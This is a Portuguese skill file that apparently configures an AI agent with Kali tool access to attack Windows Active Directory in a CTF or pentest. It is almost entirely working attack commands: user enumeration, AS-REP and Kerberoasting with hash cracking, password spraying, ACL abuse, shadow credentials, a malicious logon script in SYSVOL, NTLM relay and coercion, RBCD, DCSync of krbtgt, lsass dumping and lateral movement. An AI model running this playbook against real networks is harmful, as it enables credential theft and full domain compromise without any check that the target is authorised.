---
name: ctf-ad
description: Use esta skill quando o usuário estiver atacando um ambiente Windows com Active Directory em um CTF ou pentest e mencionar "active directory", "AD", "domínio", "domain controller", "kerberos", "bloodhound", "SMB", "LDAP", "netexec", "impacket", "kerberoasting", "AS-REP", "NTLM relay", "lateral movement", "domain admin", "RBCD", "shadow credentials", "GMSA", "GPO abuse", "WriteSPN", "logon script", "RID cycling", ou quiser comprometer um domínio Windows.
argument-hint: <domain-controller-ip> [domínio]
allowed-tools: [mcp__mcp-kali-server__enum4linux_scan, mcp__mcp-kali-server__execute_command, mcp__mcp-kali-server__nmap_scan]
---

# CTF AD — Active Directory Attack Methodology

Esta skill implementa uma metodologia estruturada para ataques em Active Directory baseada em padrões da indústria.

## Informações necessárias

- DC_IP: IP do Domain Controller
- DOMAIN: nome do domínio (ex: domain.local)
- Credenciais se disponíveis (USER:PASS ou hash)

## Fase 1 — Enumeração sem credenciais

### 1a — SMB/LDAP unauthenticated:
Use `enum4linux_scan` no DC_IP.

Use `execute_command` com:
```bash
# Enumerar domínio e versão do SO
netexec smb <DC_IP>

# Null session e guest
netexec smb <DC_IP> -u '' -p '' --shares
netexec smb <DC_IP> -u 'guest' -p '' --shares

# RID cycling — enumerar usuários SEM credenciais
netexec smb <DC_IP> -u '' -p '' --rid-brute 4000
lookupsid.py -no-pass 'guest@<DC_IP>' 20000
# Retorna: 500: DOMAIN\Administrator, 1000: DOMAIN\user1, etc.
```

### 1b — LDAP anônimo:
```bash
ldapsearch -x -H ldap://<DC_IP> -b "DC=<DOMAIN>,DC=<TLD>" \
  "(objectClass=user)" sAMAccountName description mail 2>/dev/null | head -100

# LDAP domain dump
ldapdomaindump -u '' -p '' <DC_IP> -o /tmp/ldap/
```

### 1c — Checar descrições de usuários — credenciais frequentemente deixadas lá!
```bash
netexec ldap <DC_IP> -u '' -p '' -M get-desc-users
ldapsearch -x -H ldap://<DC_IP> -b "DC=<DOMAIN>,DC=<TLD>" \
  "(description=*)" sAMAccountName description 2>/dev/null
```

### 1d — AS-REP Roasting sem credenciais:
```bash
GetNPUsers.py <DOMAIN>/ -usersfile /tmp/users.txt -no-pass -dc-ip <DC_IP>
# Com lista de usuários comuns
GetNPUsers.py <DOMAIN>/ \
  -usersfile /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt \
  -no-pass -dc-ip <DC_IP>

# Crackear ticket TGT obtido
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### 1e — Username guessing (Pre-Win2000 groups):
```bash
# Computadores em "Pre-Windows 2000 Compatible Access" → senha = lowercase do nome sem $
# Ex: WORKSTATION01$ → senha: workstation01
netexec smb <DC_IP> -u 'WORKSTATION01$' -p 'workstation01'
```

### 1f — Kerbrute user enumeration:
```bash
kerbrute userenum -d <DOMAIN> \
  /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt \
  --dc <DC_IP>
```

### 1g — Spraying de senha padrão:
```bash
# Checar shares SMB para arquivos com credenciais default
smbclient -N -L //<DC_IP>
smbclient -N //<DC_IP>/HR
# Frequente: "Notice from HR.txt" com senha inicial como Company$Year!
```

## Fase 2 — Com credenciais válidas

### 2a — Validar e expandir acesso:
```bash
netexec smb <DC_IP> -u <USER> -p <PASS>
netexec smb <DC_IP> -u <USER> -p <PASS> --shares
netexec ldap <DC_IP> -u <USER> -p <PASS>

# Password spray em todos os usuários encontrados
netexec smb <DC_IP> -u users.txt -p '<SENHA>' --continue-on-success
# Senhas comuns: Welcome1, Password123!, <Company>2024!

# Spray username=password
netexec smb <DC_IP> -u users.txt -p users.txt --no-bruteforce --continue-on-success

# Verificar admin em outras máquinas da rede
netexec smb <SUBNET>/24 -u <USER> -p <PASS> --local-auth
```

### 2b — Coletar dados para BloodHound:
```bash
bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -ns <DC_IP> -c All --zip

# RustHound (mais rápido e stealthy)
rusthound-ce -d <DOMAIN> -u <USER>@<DOMAIN> -p '<PASS>' -i <DC_IP> -o /tmp/bh/
```

**Queries BloodHound essenciais:**
- "Shortest Paths to Domain Admins"
- "Find all Domain Admins"
- "Find Kerberoastable Users with high impact"
- "Find AS-REP Roastable Users"
- "Shortest Paths from Owned Principals"
- "Find Principals with DCSync Rights"

### 2c — Kerberoasting:
```bash
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile /tmp/kerb.txt

hashcat -m 13100 /tmp/kerb.txt /usr/share/wordlists/rockyou.txt
```

### 2d — Targeted Kerberoast via WriteSPN/GenericWrite:
```bash
# Se tiver GenericWrite sobre um usuário: adicionar SPN falso e kerberoastar
Set-DomainObject -Identity <TARGET_USER> -Set @{serviceprincipalname='fake/user'}
Get-DomainSPNTicket -SPN 'fake/user' -OutputFormat Hashcat

# Com targetedKerberoast.py
targetedKerberoast.py -d <DOMAIN> -u <USER> -p <PASS> --dc-ip <DC_IP>
```

### 2e — GMSA Password Extraction:
```bash
netexec ldap <DC_IP> -u <USER> -p <PASS> --gmsa
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC_IP> get object 'gMSA_account$' --attr msDS-ManagedPassword
GMSAPasswordReader.exe --AccountName 'gMSA_account$'
```

### 2f — LAPS (Local Admin Password):
```bash
netexec ldap <DC_IP> -u <USER> -p <PASS> -M laps
Get-ADComputer <COMPUTERNAME> -property 'ms-mcs-admpwd'
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> get object <COMPUTER>$ --attr ms-mcs-admpwd
```

## Fase 3 — ACL Abuse e privilege escalation no AD

### Identificar ACLs perigosas (BloodHound + PowerView):
```bash
# GenericAll / GenericWrite → reset de senha ou adicionar ao grupo
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC_IP> set password <TARGET_USER> 'NewPass123!'
net rpc password <TARGET_USER> 'NewPass123!' -U <DOMAIN>/<USER>%<PASS> -S <DC_IP>

# ForceChangePassword
changepasswd.py '<DOMAIN>/<USER>:<PASS>@<DC_IP>' -newpass 'NewPass123!' -altuser <TARGET_USER> -no-pass

# WriteOwner → tomar ownership e dar permissões
owneredit.py -action write -new-owner <USER> -target <TARGET_GROUP> '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
dacledit.py -action write -rights WriteMembers -principal <USER> -target <TARGET_GROUP> '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>

# AddSelf / Self → adicionar a si mesmo ao grupo
bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC_IP> add groupMember <TARGET_GROUP> <USER>

# WriteDACL → dar DCSync rights a si mesmo
dacledit.py -action write -rights DCSync -principal <USER> \
  -target-dn "DC=<DOMAIN>,DC=<TLD>" '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
```

### Shadow Credentials (stealth — sem resetar senha):
```bash
# Adicionar key credential ao usuário alvo
certipy shadow auto -username <USER>@<DOMAIN> -password <PASS> -account <TARGET_USER> -dc-ip <DC_IP>
# Retorna: NTLM hash do TARGET_USER

# Manualmente:
pywhisker.py -d <DOMAIN> -u <USER> -p <PASS> --target <TARGET_USER> --action add -dc-ip <DC_IP>
certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>
```

### Logon Script Injection (WriteProperty em ScriptPath):
```bash
# Colocar script malicioso no SYSVOL
smbclient //<DC_IP>/SYSVOL -U '<DOMAIN>/<USER>%<PASS>'
# > mkdir scripts
# > put rev.bat scripts/rev.bat

# Definir logon script do usuário alvo
Set-ADUser -Identity <TARGET_USER> -ScriptPath 'scripts\rev.bat'
# Executa na próxima vez que o usuário fizer logon
```

### GPO Abuse (GPO Managers):
```bash
# SharpGPOAbuse — adicionar ao local admins
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName "Default Domain Policy"
gpupdate /force  # aplicar
```

## Fase 4 — NTLM Relay e coerção de autenticação

### Verificar SMB signing:
```bash
netexec smb <SUBNET>/24 --gen-relay-list /tmp/targets.txt
netexec ldap <DC_IP> -u <USER> -p <PASS> -M ldap-checker  # verificar LDAP signing
```

### NTLM Relay para LDAP / LDAPS:
```bash
# Terminal 1: Responder (capturar hashes)
responder -I tun0 -dPv --lm

# Terminal 2: ntlmrelayx para LDAP
ntlmrelayx.py -tf /tmp/targets.txt -smb2support --no-http-server

# Relay para LDAPS com shadow credentials
ntlmrelayx.py -t ldaps://<DC_IP> -smb2support --shadow-credentials --shadow-target <MACHINE>$

# Forçar autenticação do DC (PetitPotam)
PetitPotam.py -d <DOMAIN> -u <USER> -p <PASS> <KALI_IP> <DC_IP>
# Ou via DFSCoerce:
netexec smb <DC_IP> -u <USER> -p <PASS> -M coerce_plus -o LISTENER=<KALI_IP>
```

### Cross-Session Relay (usuários logados):
```bash
# RemotePotato0 — captura NTLM de usuário logado na sessão
RemotePotato0.exe -m 0 -r <KALI_IP> -x <KALI_IP> -p 9999 -s 1
# Listener no Kali:
ntlmrelayx.py -t ldap://<DC_IP> --no-smb-server --no-http-server \
  --escalate-user <OUR_USER>

# KrbRelay — variante Kerberos
```

### DNS record injection para captura NTLM:
```bash
dnstool.py -u '<DOMAIN>\<USER>' -p '<PASS>' -m add <DNS_RECORD> \
  -t TXT -d '<CREDENTIAL_TARGET_INFO_BASE64>' -dns-ip <DC_IP>
```

## Fase 5 — RBCD (Resource-Based Constrained Delegation)

```bash
# Pré-requisito: ter GenericWrite sobre objeto de computador

# Passo 1: Criar conta de computador falsa (machine account quota > 0)
addcomputer.py -computer-name 'fake-computer$' -computer-pass 'Password123!' \
  '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>

# Passo 2: Configurar RBCD — delegar de fake-computer$ para TARGET$
rbcd.py -delegate-from 'fake-computer$' -delegate-to '<TARGET>$' \
  -action write '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>

# Passo 3: S4U2Self + S4U2Proxy para obter ticket de Administrator
getST.py -spn 'cifs/<TARGET>.<DOMAIN>' -impersonate Administrator \
  '<DOMAIN>/fake-computer$:Password123!' -dc-ip <DC_IP>

# Passo 4: Usar ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass '<TARGET>.<DOMAIN>'
```

## Fase 6 — Kerberos Delegation

### Unconstrained Delegation (máquinas com TrustedForDelegation):
```bash
netexec ldap <DC_IP> -u <USER> -p <PASS> --trusted-for-delegation

# Quando uma máquina com unconstrained delegation é comprometida:
# Coerção → DC autentica na máquina → TGT do DC fica na memória
# Usar Rubeus para monitorar e extrair TGTs
.\Rubeus.exe monitor /interval:5 /nowrap
# Depois de coerção:
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>
```

### Constrained Delegation com S4U2Proxy:
```bash
# Verificar
netexec ldap <DC_IP> -u <USER> -p <PASS> -M constrained-delegation

# Obter ST para serviço permitido
getST.py -spn 'cifs/<TARGET>' -impersonate Administrator \
  '<DOMAIN>/<SERVICE_ACCOUNT>:<PASS>' -dc-ip <DC_IP>
```

## Fase 7 — DCSync e pós-exploração

```bash
# DCSync — requer GetChanges + GetChangesAll
secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC_IP>
secretsdump.py -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<DC_IP>
secretsdump.py -k -no-pass <DOMAIN>/<USER>@<DC_IP>  # com Kerberos ticket

# Apenas usuários específicos
secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-user Administrator
secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-user krbtgt
```

## Fase 8 — Lateral Movement

```bash
# WinRM (porta 5985)
evil-winrm -i <TARGET_IP> -u <USER> -p <PASS>
evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>
evil-winrm -i <TARGET_IP> -S -c cert.crt -k cert.key  # com certificado (HTB Timelapse)

# PsExec / SMBExec / WMIExec
psexec.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP>
psexec.py -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>
wmiexec.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP>
smbexec.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP>

# Pass-the-Ticket
export KRB5CCNAME=/tmp/ticket.ccache
psexec.py -k -no-pass <USER>@<TARGET>.<DOMAIN>
```

## Fase 9 — Memory dump analysis (HTB Freelancer)

```bash
# Se encontrar arquivo .DMP no desktop/shares
memprocfs -device MEMORY.DMP -mount /mnt/memdump
ls /mnt/memdump/registry/

# Extrair hashes dos registry hives
secretsdump.py -sam /mnt/memdump/registry/SAM \
               -system /mnt/memdump/registry/SYSTEM \
               -security /mnt/memdump/registry/SECURITY LOCAL

# LSA secrets podem ter plaintext
# Pypykatz para análise de lsass dump
pypykatz lsa minidump lsass.dmp
```

## Fase 10 — Cross-forest Trust (HTB DarkZero)

```bash
# Verificar trusts
netexec smb <DC_IP> -u <USER> -p <PASS> --trusts
Get-ADTrust -Filter *

# Com SYSTEM no DC de uma floresta:
# Extrair TGT da máquina do outro DC via Rubeus
.\Rubeus.exe tgtdeleg /target:<TARGET_FOREST_DC>

# DCSync across trust com TGT
export KRB5CCNAME=dc_machine.ccache
secretsdump.py -k -no-pass <TARGET_DOMAIN>/<DC_ACCOUNT>$@<TARGET_DC>

# MSSQL Linked Servers cross-forest (HTB DarkZero)
# DC01 → linked server → DC02 com mapeamento de sysadmin
EXEC ('xp_cmdshell ''whoami''') AT [DC02_LINKED_SERVER]
```

## Checklist do 0xdf

```
[ ] netexec smb <DC_IP> → versão, domínio, signing
[ ] RID cycling: lookupsid.py ou netexec --rid-brute
[ ] Checar descrições de usuários no LDAP
[ ] Checar SMB shares para arquivos com credenciais (Notice from HR, etc.)
[ ] ASREP roasting (sem credenciais)
[ ] Pre-Win2000 machines: senha = lowercase hostname sem $
[ ] Com creds: bloodhound-python -c All
[ ] Kerberoasting → hashcat 13100
[ ] GMSA → netexec --gmsa
[ ] LAPS → netexec -M laps
[ ] BloodHound: Shortest Path to DA, ACLs perigosas
[ ] Shadow credentials (mais stealthy que reset de senha)
[ ] RBCD se GenericWrite em computador
[ ] NTLM relay se SMB signing off
[ ] GPO abuse se GPO Managers
[ ] Logon script se WriteProperty em ScriptPath
[ ] Memory dump se .DMP acessível: memprocfs + secretsdump
```
